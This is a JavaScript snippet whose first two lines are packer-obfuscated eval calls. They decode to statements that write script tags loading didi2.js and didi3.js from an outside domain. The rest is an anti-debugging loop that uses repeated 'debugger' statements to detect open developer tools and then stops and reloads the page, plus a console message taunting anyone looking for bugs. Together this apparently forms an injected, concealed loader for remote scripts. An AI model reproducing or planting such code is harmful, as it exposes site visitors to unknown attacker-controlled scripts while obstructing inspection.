eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.2("<0 3=\\\'4://5.6.7/8/9.a\\\'></0>");',11,11,'script|document|writeln|src|https|tz|smeku|com|myt|didi2|js'.split('|'),0,{}))
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.2("<0 3=\\\'4://5.6.7/8/9.a\\\'></0>");',11,11,'script|document|writeln|src|https|tz|smeku|com|myt|didi3|js'.split('|'),0,{}))
var check = (function () {
    var callbacks = [], timeLimit = 50, open = false;
    setInterval(loop, 1);
    return {
        addListener: function (fn) {
            callbacks.push(fn);
        },
        cancleListenr: function (fn) {
            callbacks = callbacks.filter(function (v) {
                return v !== fn;
            });
        }
    }
    function loop() {
        var startTime = new Date();
        debugger;
        if (new Date() - startTime > timeLimit) {
            if (!open) {
                callbacks.forEach(function (fn) {
                    fn.call(null);
                });
            }
            open = true;
			window.stop();
	        //alert('这位朋友你想看点什么!');
			//window.location.href="/";
        } else {
            open = false;
        }
    }
})();
if (window["console"]) {
	console.log("%c大神,这里没有BUG去别的地方找找吧！", "font-size:18pt;color:#f60;")
}
check.addListener(function () {
	window.location.reload();
});